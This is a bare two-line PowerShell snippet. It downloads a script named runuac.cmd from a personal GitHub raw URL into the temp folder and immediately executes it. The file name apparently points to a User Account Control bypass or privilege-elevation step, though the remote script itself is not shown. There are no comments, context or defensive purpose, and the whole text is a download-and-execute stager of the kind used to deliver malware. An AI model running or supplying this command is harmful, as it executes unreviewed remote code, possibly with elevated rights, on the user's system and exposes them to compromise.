Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/runuac.cmd" -OutFile "$temp\runuac.cmd"
Start-Process -FilePath "$temp\runuac.cmd"
